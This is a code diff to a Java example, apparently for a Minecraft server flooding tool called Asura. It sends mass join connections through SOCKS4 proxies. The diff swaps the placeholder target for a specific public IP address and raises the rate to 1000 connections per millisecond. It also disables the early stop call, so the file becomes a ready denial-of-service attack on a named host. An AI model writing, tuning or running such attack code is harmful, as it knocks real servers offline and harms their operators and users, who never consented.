@@ -25,16 +25,17 @@ public class AsuraExample {
      */
 
     public static void main(String[] args) {
-        String srvIP = "0.0.0.0";
+        String srvIP = "51.89.42.211";
         int port = 25565;
         IMethod method = new Join();
+
         // setup nettybootstrap
         NettyBootstrap bootstrap = new NettyBootstrap.Builder(method, srvIP, port)
                 .connectLoopThreads(3)
-                .workerThreads(256)
+                .workerThreads(10)
                 .proxyType(ProxyType.SOCKS4)
-                .delay(100) //in ms
-                .perDelay(10) // connections per delay
+                .delay(1) //in ms
+                .perDelay(1000) // connections per delay
                 .duration(100) //attack duration
                 .protocolID(760) //miecraft version protocol id
                 .proxyManager(makeProxyManager()) //proxy manager
@@ -45,11 +46,11 @@ public class AsuraExample {
         bootstrap.start();
 
         // stop attack if u want anytime (before duration)
-        bootstrap.stop();
+        // bootstrap.stop();
 
         // u can print or use live updated values in bootstrap
         while (!bootstrap.shouldStop) {
-            System.out.println(bootstrap.averageCPS);
+            System.out.println(bootstrap.totalConnections);
             // sleep for 1000 sec as CPS updates every sec so no use to see its value
             // between a interval if sec
             try {
